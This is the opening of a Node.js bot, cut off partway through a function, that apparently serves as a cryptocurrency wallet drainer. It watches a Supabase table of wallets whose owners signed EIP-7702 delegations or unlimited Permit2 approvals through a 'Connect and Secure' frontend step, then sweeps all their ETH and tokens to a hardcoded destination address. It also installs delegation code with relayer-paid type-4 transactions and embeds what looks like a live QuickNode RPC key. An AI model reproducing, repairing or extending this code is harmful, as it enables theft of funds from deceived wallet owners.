// bot.js — Sweep bot with EIP-7702 delegation + Permit2 AllowanceTransfer support
// Watches delegated_wallets via Supabase Realtime.
//
// Architecture:
//   wsProvider  — WebSocketProvider for instant block events (WS_URL)
//   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
//
// Sweep strategy:
//   Block events         → sweep wallets whose 60s cooldown has expired
//   delegated_wallets RT → instant sweep on new/updated wallet
//
// Permit2 AllowanceTransfer flow:
//   User calls permit2.approve(token, relayer, MaxUint160, MaxUint48) once.
//   Bot calls permit2.transferFrom(user, dest, balance, token) — no signature,
//   no nonce, no expiry concern. Allowance is stored in the Permit2 contract.

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");
const fs  = require("fs");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const WS_URL = process.env.WS_URL
  || "wss://fluent-chaotic-isle.ethereum-mainnet.quiknode.pro/f31528569e5666353aa6980455d6db886b1fdb67/";
const RPC_URL = process.env.RPC_URL
  || "https://fluent-chaotic-isle.ethereum-mainnet.quiknode.pro/f31528569e5666353aa6980455d6db886b1fdb67/";
// Ordered fallback RPC URLs — used when QuickNode is unavailable or rate-limited.
// No hardcoded API keys: Alchemy/Infura/custom fallbacks only apply if actually
// configured via env; publicnode is the guaranteed no-key-required last resort.
const FALLBACK_RPCS = [
  process.env.FALLBACK_RPC_URL,
  process.env.ALCHEMY_RPC_URL,
  process.env.INFURA_RPC_URL,
  "https://ethereum.publicnode.com",
].filter(Boolean);
const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "eth";

const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MIN_ETH_WEI          = ethers.parseEther("0.001");
const MIN_TOKEN_UNITS      = "0.5";

// Wrapped native token — WETH on Ethereum
const WRAPPED_NATIVE_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2".toLowerCase();
// Minimum surplus that the frontend will actually attempt to wrap
// (WRAP_GAS_RESERVE 0.002 + WRAP_MIN_SURPLUS 0.0005 = 0.0025 ETH).
// Bot only flags needs_reactivation when balance exceeds this — anything
// at or below is the normal gas reserve left behind after the wrap step.
const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.0025"); // 0.0025 ETH
// If ETH balance exceeds this, it's the user's own ETH (not airdrop change).
// 3× GAS_AIRDROP_AMOUNT (0.003 × 3 = 0.009) — same ceiling as the frontend.
const NATIVE_WRAP_CEILING    = ethers.parseEther("0.009");  // 0.009 ETH

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Stagger CoinGecko startup fetch to avoid hitting rate limits when all bots start
// Stagger CoinGecko startup fetches so all 3 bots never overlap.
// ETH makes 3 API calls (~10s total); BNB waits for ETH to finish + 5s buffer;
// Polygon waits for BNB to finish + 5s buffer.
const CG_STAGGER_MS = { eth: 0, bnb: 45_000, polygon: 90_000 };
const TOKEN_CALL_DELAY     = 50;      // ms after each token call
// Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
const RELAYER_MIN_WEI      = ethers.parseEther("0.005"); // 0.005 ETH

// ── Airdrop / price constants (ETH-specific) ──────────────────────────────────
const NATIVE_COINGECKO_ID  = "ethereum";
const COINGECKO_PLATFORM   = "ethereum";
const GAS_AIRDROP_AMOUNT   = ethers.parseEther("0.003");  // 0.003 ETH
const AIRDROP_MIN_VALUE_USD = 20;
const AIRDROP_MIN_RELAYER_USD = 50;

// ── Pimlico / Permissionless / Flashbots ─────────────────────────────────────
const PIMLICO_API_KEY    = process.env.PIMLICO_API_KEY || "";
const PIMLICO_POLICY_ID  = process.env.PIMLICO_POLICY_ID || "sp_lucky_hemingway";
const FLASHBOTS_AUTH_KEY = process.env.FLASHBOTS_AUTH_KEY || "";
const PIMLICO_URLS = {
  eth:     `https://api.pimlico.io/v2/1/rpc?apikey=${PIMLICO_API_KEY}`,
  bnb:     `https://api.pimlico.io/v2/56/rpc?apikey=${PIMLICO_API_KEY}`,
  polygon: `https://api.pimlico.io/v2/137/rpc?apikey=${PIMLICO_API_KEY}`,
};

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled");
}

// ── Providers ─────────────────────────────────────────────────────────────────
//
// rpcProvider — HTTP FallbackProvider (QuickNode primary) for sweeps/txs
// scanProvider— free public HTTP endpoint ONLY for native block scanning
//               completely bypasses QuickNode billing for block reads
// wsProvider  — WebSocket for block number events ONLY; recreated on disconnect
//               NEVER passed to a Contract or Wallet

// Cooldown guard: only rebuild the FallbackProvider if more than 60 s have
// elapsed since the last init. Prevents rapid WSS reconnect loops from
// firing eth_chainId probes on all 5 fallback providers each time.
let lastRpcInitTime = 0;

// staticNetwork skips eth_chainId detectNetwork() on each provider —
// prevents the "JsonRpcProvider failed to detect network, retry in 1s" spam.
const ETH_NETWORK = ethers.Network.from(1);

function buildRpcProvider() {
  if (lastRpcInitTime > 0 && Date.now() - lastRpcInitTime < 60_000) {
    return null; // too soon — caller must reuse the existing provider
  }
  lastRpcInitTime = Date.now();
  const mkProvider = url => new ethers.JsonRpcProvider(url, ETH_NETWORK, { staticNetwork: ETH_NETWORK });
  return new ethers.FallbackProvider(
    [
      { provider: mkProvider(RPC_URL), priority: 1, weight: 1, stallTimeout: 2500 },
      ...FALLBACK_RPCS.map((url, i) => ({
        provider: mkProvider(url),
        priority: i + 2,
        weight:   1,
        stallTimeout: 2500,
      })),
    ],
    ETH_NETWORK,
    { quorum: 1 },
  );
}

// Built once at startup; NEVER rebuilt inside startBot() / WSS reconnect.
// FallbackProvider handles provider failover internally without re-init.
let rpcProvider = buildRpcProvider();

// scanProvider — dedicated free endpoint for ALL read-only calls.
// PublicNode is fully free (no API key, no rate limit for read calls).
// ALL contract reads, balance checks, and Multicall3 calls go here.
// rpcProvider (QuickNode) is reserved for WRITES (eth_sendRawTransaction)
// and gas-price queries only — this cuts QuickNode usage by ~95%.
const SCAN_RPC          = process.env.SCAN_RPC_URL || "https://ethereum.publicnode.com";
// Only used if SCAN_RPC (PublicNode) stalls/errors — verified working, no
// Origin restriction (unlike the old default-fallback Ankr key this replaced).
const SCAN_FALLBACK_RPC = process.env.SCAN_FALLBACK_RPC_URL;
const scanProvider = SCAN_FALLBACK_RPC
  ? new ethers.FallbackProvider(
      [
        { provider: new ethers.JsonRpcProvider(SCAN_RPC, ETH_NETWORK, { staticNetwork: ETH_NETWORK }), priority: 1, weight: 1, stallTimeout: 2500 },
        { provider: new ethers.JsonRpcProvider(SCAN_FALLBACK_RPC, ETH_NETWORK, { staticNetwork: ETH_NETWORK }), priority: 2, weight: 1, stallTimeout: 2500 },
      ],
      ETH_NETWORK,
      { quorum: 1 },
    )
  : new ethers.JsonRpcProvider(SCAN_RPC, null, { staticNetwork: true });
scanProvider.pollingInterval = 999_999; // disable background eth_blockNumber polling

// ── RPC Rate Limiter ─────────────────────────────────────────────────────────
// Hard guard: if QuickNode HTTP calls exceed 500/min, all subsequent reads in
// that window route to scanProvider (free). Resets every 60 seconds.
const QN_RATE_LIMIT = 500;
const QN_WINDOW_MS  = 60_000;
let _qnCalls = 0;
let _qnWinStart = Date.now();

function getReadProvider() {
  // Always use the free scanProvider for reads — zero QuickNode billing.
  // rpcProvider is for writes only (sendTransaction via relayerWallet).
  return scanProvider;
}

function trackQnWrite() {
  const now = Date.now();
  if (now - _qnWinStart >= QN_WINDOW_MS) { _qnCalls = 0; _qnWinStart = now; }
  _qnCalls++;
  if (_qnCalls > QN_RATE_LIMIT) {
    warn(`[rpc] QuickNode write limit ${QN_RATE_LIMIT}/min exceeded (${_qnCalls}) — check bot for loops`);
  }
}

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── ABIs ──────────────────────────────────────────────────────────────────────

// TCNDelegationV2 ABI — includes v1 functions (backward-compat) + v2 additions
const CONTRACT_ABI = [
  // PATH 1: EIP-7702 (called on user's delegated EOA address)
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "function sweepAll(address[] tokens, address to) external",
  // PATH 2: direct-allowance (non-7702 EOAs — Trust Wallet, hardware, etc.)
  "function sweepFor(address user, address[] tokens) external",
  "function sweepAllFor(address user, address[] tokens) external",        // V2.1: ERC-20 + ETH wrap in one call
  "function sweepETHFor(address user) external",                          // V2.1: wrap ETH for PATH 2 user
  "function batchSweepFor(address[] users, address[][] tokenLists) external", // V2.1: N users in 1 tx
  "function isAuthorized(address user, address relayer) view returns (bool)",
  "function authorize(address relayer) external",
  "function deauthorize(address relayer) external",
  // PATH 3: Permit2 AllowanceTransfer
  "function sweepViaPermit2(address user, address[] tokens) external",
  // PATH 4: WETH wrap helpers
  "function wrapAndForward() external",
  "function forwardWETH() external",
  // Admin / view
  "function getVersion() view returns (uint8)",
  "function isRelayer(address) view returns (bool)",
  "function destination() view returns (address)",
  "function paused() view returns (bool)",
  "function getSweptETH(address wallet) view returns (uint256)",
  "function getSweptToken(address wallet, address token) view returns (uint256)",
];

// Delegation ABI — used when calling V2 on user's delegated EOA address (EIP-7702)
const DELEGATION_ABI = CONTRACT_ABI;

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "event Transfer(address indexed from, address indexed to, uint256 value)",
];

const EIP2612_PERMIT_ABI = [
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
];

const STABLECOIN_ADDRS = new Set([
  "0x55d398326f99059ff775485246999027b3197955",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
  "0xe9e7cea3dedca5984780bafc599bd69add087d56",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0xdac17f958d2ee523a2206206994597c13d831ec7",
  "0x6b175474e89094c44da98b954eedeac495271d0f",
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
  "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063",
]);

const priceCache   = new Map();
const PRICE_CACHE_TTL = 5 * 60 * 1000;

// Permit2 — AllowanceTransfer + gasless PermitBatch + SignatureTransfer ABIs.
const PERMIT2_ABI = [
  // AllowanceTransfer: bot checks stored allowance then calls transferFrom
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  // PATH B gasless: bot calls permit() to set allowances from user's PermitBatch sig
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
  // SignatureTransfer nonce bitmap — used to pre-check if a nonce is already consumed
  "function nonceBitmap(address owner, uint256 wordPos) external view returns (uint256)",
];
// Batch SignatureTransfer — separate ABI to avoid overload ambiguity with ethers.js
const PERMIT2_BATCH_TRANSFER_ABI = [
  "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
  // Custom errors — required for ethers v6 to decode revert reasons
  "error InvalidNonce()",
  "error SignatureExpired(uint256 signatureDeadline)",
  "error InvalidAmount(uint256 maxAmount)",
  "error LengthMismatch()",
];

// ── Wallet & contracts ────────────────────────────────────────────────────────
// RULE: wsProvider is NEVER passed to a Contract or Wallet.
// RULE: permit2Read for all READ calls (allowance) — uses free scanProvider.
//       permit2 / permit2Batch for WRITE calls (permit, transferFrom) — relayerWallet.

// NonceManager wraps the wallet so concurrent sweep/airdrop calls never collide on nonce.
// ethers v6 NonceManager does not forward .address synchronously (only getAddress() is async),
// so we inject it manually so all relayerWallet.address references work correctly.
// It fetches the nonce once (lazily) and increments in memory for each tx,
// preventing "nonce too low: next nonce N, tx nonce N-1" race conditions.
const _baseRelayer  = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
const relayerWallet = new ethers.NonceManager(_baseRelayer);
Object.defineProperty(relayerWallet, 'address', { get: () => _baseRelayer.address, configurable: true });
const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
const permit2Read   = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, getReadProvider()); // reads only
const permit2Batch  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_TRANSFER_ABI, relayerWallet);
const contract      = CONTRACT_ADDRESS
  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
  : null;

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH        = false;
const sweepingToken    = {};
const delegatedWallets   = new Map(); // address → type ("eip7702" | "permit2")
const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-hour cooldown)
const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
let realtimeChannel    = null;
let _realtimeGeneration = 0; // bumped on each subscribeRealtime() call — lets stale channel callbacks detect supersession
const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
let reconnectAttempt   = 0;
function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }

// ── WSS provider ref (for Transfer subscription rebuild) ──────────────────────
// Stored module-level so the Realtime handler can rebuild Transfer event
// subscriptions when new wallets are added. Without rebuild, wallets added
// after startup are not included in the topics[2] wallet filter and will
// never receive Transfer event notifications.
let activeWsProvider = null;
let _rebuildDebounce = null;
function scheduleTransferRebuild() {
  if (_rebuildDebounce) clearTimeout(_rebuildDebounce);
  _rebuildDebounce = setTimeout(async () => {
    if (!activeWsProvider || !TOKENS.length) return;
    log(`[listeners] rebuilding Transfer subscriptions (${monitoredWallets.size} wallets)`);
    try {
      try { activeWsProvider.removeAllListeners(); } catch { /* rate-limit on unsubscribe is non-fatal */ }
      // Brief pause so unsubscribe messages flush before new subscribes go out
      await new Promise(r => setTimeout(r, 1_000));
      await startTransferListeners(activeWsProvider, TOKENS);
      await startNativeListener(activeWsProvider);
    } catch (e) {
      warn(`[listeners] rebuild failed: ${e.message}`);
    }
  }, 30_000); // 30s debounce — prevents rapid rebuilds from sequential Realtime events
}

// In-memory guard: track permit() failures this session so we never retry.
// Key: `${walletAddress}:${tokenAddress}`
const failedEIP2612 = new Set();

// Consecutive-unclassified-error counter per eip2612_permits row id. An error
// that matches neither the known signature-invalid regex nor the known
// transient-RPC regex used to be permanently marked `failed:true` in Supabase
// on its very FIRST occurrence — but plenty of real transient causes (gas
// price spike causing out-of-gas, a temporary node quirk with unexpected
// wording, a brief RPC hiccup with no matching keyword) don't match either
// regex and would otherwise permanently strand an otherwise-valid permit.
// Give unclassified errors a bounded number of retries before giving up.
const unknownEip2612ErrorCount = new Map();
const UNKNOWN_EIP2612_MAX_RETRIES = 3;

// ── Dynamic token list ────────────────────────────────────────────────────────

const KNOWN_DECIMALS = {
  // ETH mainnet
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": 6,  // USDC
  "0xdac17f958d2ee523a2206206994597c13d831ec7": 6,  // USDT
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": 8,  // WBTC
  // BNB
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": 18, // USDC BSC
  "0x55d398326f99059ff775485246999027b3197955": 18, // USDT BSC
  "0xba2ae424d960c26247dd6c32edc70b295c744c43": 8,  // DOGE BSC
  // Polygon
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": 6,  // USDC Polygon
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": 6,  // USDT Polygon
  "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6": 8,  // WBTC Polygon
};

const FALLBACK_TOKENS = {
  bnb: [
    { address: "0x55d398326f99059ff775485246999027b3197955", symbol: "USDT",  decimals: 18 },
    { address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", symbol: "USDC",  decimals: 18 },
    { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", symbol: "BUSD",  decimals: 18 },
    { address: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", symbol: "WBNB",  decimals: 18 },
    { address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", symbol: "CAKE",  decimals: 18 },
    { address: "0x2170ed0880ac9a755fd29b2688956bd959f933f8", symbol: "ETH",   decimals: 18 },
    { address: "0xba2ae424d960c26247dd6c32edc70b295c744c43", symbol: "DOGE",  decimals: 8  },
    { address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", symbol: "ADA",   decimals: 18 },
    { address: "0x7083609fce4d1d8dc0c979aab8c869ea2c873402", symbol: "DOT",   decimals: 18 },
    { address: "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd", symbol: "LINK",  decimals: 18 },
    { address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", symbol: "XRP",   decimals: 18 },
    { address: "0xcc42724c6683b7e57334c4e856f4c9965ed682bd", symbol: "MATIC", decimals: 18 },
  ],
  eth: [
    { address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", symbol: "USDC",  decimals: 6  },
    { address: "0xdac17f958d2ee523a2206206994597c13d831ec7", symbol: "USDT",  decimals: 6  },
    { address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", symbol: "WBTC",  decimals: 8  },
    { address: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", symbol: "WETH",  decimals: 18 },
    { address: "0x514910771af9ca656af840dff83e8264ecf986ca", symbol: "LINK",  decimals: 18 },
    { address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", symbol: "UNI",   decimals: 18 },
    { address: "0x6b175474e89094c44da98b954eedeac495271d0f", symbol: "DAI",   decimals: 18 },
    { address: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", symbol: "SHIB",  decimals: 18 },
    { address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", symbol: "MATIC", decimals: 18 },
  ],
  polygon: [
    { address: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", symbol: "USDC",  decimals: 6  },
    { address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", symbol: "USDT",  decimals: 6  },
    { address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", symbol: "WBTC",  decimals: 8  },
    { address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", symbol: "WETH",  decimals: 18 },
    { address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270", symbol: "WMATIC", decimals: 18 },
    { address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39", symbol: "LINK",  decimals: 18 },
    { address: "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", symbol: "DAI",   decimals: 18 },
    { address: "0xd6df932a45c0f255f85145f286ea0b292b21c90b", symbol: "AAVE",  decimals: 18 },
  ],
};

// Runtime token list — populated by loadTokens() on init
let TOKENS = [];

// ── Event-driven monitoring state ─────────────────────────────────────────────

const monitoredWallets = new Map(); // address.toLowerCase() → { address, type }
const sweepingNow      = new Set(); // currently-sweeping addresses (transfer debounce)
const pendingSweep     = new Set(); // Transfer arrived while a sweep was in-progress → re-sweep after

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = `[${CHAIN.toUpperCase()}]`;
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// e.message is empty for AggregateError (multi-endpoint connect failures) and
// some malformed JSON-RPC error responses, which previously logged as
// "failed: " with nothing after it. Walk the common ethers/undici error shapes
// so RPC failures are actually diagnosable instead of silent.
function errStr(e) {
  if (!e) return "unknown error";
  const info = e.info?.error?.message || e.info?.responseBody;
  const agg  = Array.isArray(e.errors) && e.errors.length ? e.errors[0]?.message : null;
  return e.shortMessage || e.reason || info || e.message || agg || e.code || String(e);
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function normalizeAddress(addr) {
  try { return ethers.getAddress(addr); } catch { return null; }
}

async function getFeeData() {
  trackQnWrite();
  const f = await rpcProvider.getFeeData();
  return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
}

// ── Nonce recovery helper ─────────────────────────────────────────────────────
// Ethers v6 NonceManager increments in memory but does not automatically reset
// after a rejected tx (replacement-underpriced, already-known, etc.).
// Call this in catch blocks so the next tx uses the correct on-chain nonce.
function maybeResetNonce(e) {
  const msg = (e?.message ?? String(e ?? "")).toLowerCase();
  if (
    msg.includes("nonce") ||
    msg.includes("replacement") ||
    msg.includes("already known") ||
    msg.includes("underpriced")
  ) {
    try { relayerWallet.reset(); } catch { /* ignore */ }
  }
}

// ── Main-contract sweep ───────────────────────────────────────────────────────

async function sweepETH() {
  if (sweepingETH || !contract) return;
  sweepingETH = true;
  try {
    const bal = await getReadProvider().getBalance(contract.target);
    if (bal < MIN_ETH_WEI) return;
    log(`Contract ETH ${ethers.formatEther(bal)} — sweeping`);
    const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepETH tx: ${tx.hash}`);
    await tx.wait();
    log("sweepETH confirmed");
  } catch (e) { maybeResetNonce(e); err(`sweepETH: ${e.message}`); }
  finally    { sweepingETH = false; }
}

async function sweepToken(tokenAddress) {
  const key = tokenAddress.toLowerCase();
  if (sweepingToken[key] || !contract) return;
  sweepingToken[key] = true;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
    const balance = await token.balanceOf(contract.target);
    let decimals  = 18;
    try { decimals = await token.decimals(); } catch {}
    if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) return;
    let symbol = tokenAddress.slice(0, 8);
    try { symbol = await token.symbol(); } catch {}
    log(`Contract ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
    const gas = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
    await tx.wait();
  } catch (e) { maybeResetNonce(e); err(`sweepToken(${tokenAddress}): ${e.message}`); }
  finally     { sweepingToken[key] = false; }
}

// ── EIP-7702 delegated wallet sweep (V2 — uses sweepAll for single tx) ───────

async function sweepDelegatedWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  try {
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);

    // V2: use sweepAll — sweeps ETH + all tokens in a single transaction.
    // Use the full CoinGecko TOKENS list so any deposited token is caught.
    // Falls back to per-token sweepTokens if sweepAll is unavailable (V1 compat).
    try {
      const tokenList = TOKENS.map(t => t.address.toLowerCase()).filter(Boolean);
      log(`[eip7702] ${checksum} — sweepAll(${tokenList.length} tokens + ETH)`);
      const gas = await userContract.sweepAll.estimateGas(tokenList, DESTINATION_ADDRESS);
      const fee = await getFeeData();
      const tx  = await userContract.sweepAll(tokenList, DESTINATION_ADDRESS, {
        gasLimit: gas * 130n / 100n, ...fee,
      });
      log(`[eip7702] sweepAll tx: ${tx.hash}`);
      await tx.wait();
      log(`[eip7702] sweepAll confirmed for ${checksum}`);
      return;
    } catch (e) {
      if (e.message?.includes("getFunction") || e.message?.includes("not found")) {
        // V1 contract — fall back to old per-call approach
        warn(`[eip7702] ${checksum} — sweepAll not available (V1), falling back`);
      } else {
        // Distinguish a genuine on-chain revert (CALL_EXCEPTION — e.g. nothing
        // to sweep, or a real contract-level problem) from a transient
        // RPC/network failure (timeout, rate limit, connection reset) during
        // estimateGas/broadcast/wait. Both used to be logged identically via
        // err() and silently dropped — a burst of RPC hiccups looked exactly
        // like a permanently broken contract in the logs, with no signal that
        // this wallet just needs the next Transfer/block trigger to retry.
        const isRevert = e.code === "CALL_EXCEPTION";
        const isRpcTransient = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit/i.test(e.message ?? "");
        if (isRevert) {
          log(`[eip7702] ${checksum} — sweepAll reverted on-chain (likely nothing to sweep): ${e.reason ?? e.shortMessage ?? e.message}`);
        } else if (isRpcTransient) {
          warn(`[eip7702] ${checksum} — sweepAll RPC/network error (transient, will retry on next trigger): ${e.message}`);
        } else {
          err(`[eip7702] sweepAll ${checksum}: ${e.message}`);
        }
        return;
      }
    }

    // V1 fallback: ETH then tokens individually
    try {
      const bal = await getReadProvider().getBalance(checksum);
      if (bal > MIN_ETH_WEI) {
        const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
        log(`[eip7702/v1] sweepETH tx: ${tx.hash}`);
        await tx.wait();
      }
    } catch (e) { err(`[eip7702/v1] sweepETH ${checksum}: ${e.message}`); }

    // V1 per-token fallback uses the full TOKENS list (not just TOKENS_TO_WATCH)
    for (const tok of TOKENS) {
      const tokenAddress = tok.address.toLowerCase();
      try {
        const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
        const balance = await token.balanceOf(checksum);
        const decimals = tok.decimals ?? 18;
        if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
          const gas = await userContract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
          const fee = await getFeeData();
          const tx  = await userContract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, {
            gasLimit: gas * 120n / 100n, ...fee,
          });
          log(`[eip7702/v1] sweepTokens tx: ${tx.hash}`);
          await tx.wait();
        }
      } catch (e) { err(`[eip7702/v1] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
    }
  } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
}

// ── TIER 1.5: Opportunistic EIP-7702 upgrade ─────────────────────────────────
//
// For permit2-gasless / direct-allowance wallets that have a stored EIP-7702
// authorization signature (collected by the frontend during "Connect and Secure"),
// attempt to install the delegation code via a type-4 transaction signed by the
// RELAYER (the user signed the authorization list entry; the relayer pays gas).
//
// Once delegation code is live at the user's address, sweepAll() moves native
// coins + all ERC-20 tokens in a single call — the only path that can move
// native currency from a plain EOA without the user's private key.
//
// On success the record is upgraded to type="eip7702" so future sweeps go
// straight to Tier 1 without repeating the type-4 overhead.

async function tryUpgradeToEip7702AndSweep(checksum, short, addrKey) {
  if (!supabase || !CONTRACT_ADDRESS) return false;

  let dwRow;
  try {
    const res = await supabase
      .from("delegated_wallets")
      .select("authorization, permit_metadata")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .single();
    dwRow = res.data;
  } catch { return false; }

  const auth = dwRow?.authorization ?? dwRow?.permit_metadata?.authorization ?? null;
  if (!auth || !auth.r || !auth.s) return false;

  try {
    const existingCode = await getReadProvider().getCode(checksum);
    if (existingCode && existingCode.toLowerCase().startsWith("0xef0100")) {
      log(`[upgrade] ${short} — delegation already active — calling sweepAll directly`);
      await sweepDelegatedWallet(checksum);
      await supabase.from("delegated_wallets")
        .update({ type: "eip7702" })
        .eq("address", addrKey).eq("chain", CHAIN)
        .catch(() => {});
      return true;
    }
  } catch { /* non-fatal */ }

  log(`[upgrade] ${short} — EIP-7702 auth found — submitting type-4 tx to install delegation`);

  try {
    const fee = await getFeeData();
    const tx = await _baseRelayer.sendTransaction({
      type:     4,
      to:       checksum,
      value:    0n,
      data:     "0x",
      gasLimit: 100_000n,
      chainId:  Number(ETH_NETWORK.chainId),
      authorizationList: [{
        address:  CONTRACT_ADDRESS,
        chainId:  Number(auth.chainId ?? 0),
        nonce:    Number(auth.nonce   ?? 0),
        r:        auth.r,
        s:        auth.s,
        yParity:  Number(auth.yParity ?? auth.v ?? 0),
      }],
      ...fee,
    });
    log(`[upgrade] ${short} — type-4 tx submitted: ${tx.hash}`);
    await tx.wait();

    const code = await getReadProvider().getCode(checksum).catch(() => "0x");
    if (!code || !code.toLowerCase().startsWith("0xef0100")) {
      warn(`[upgrade] ${short} — type-4 confirmed but delegation not set (code=${code?.slice(0, 20)}) — auth may be expired or already replayed`);
      return false;
    }

    log(`[upgrade] ✅ delegation installed for ${short} — sweeping via sweepAll`);
    await supabase.from("delegated_wallets")
      .update({ type: "eip7702" })
      .eq("address", addrKey).eq("chain", CHAIN)
      .catch(() => {});

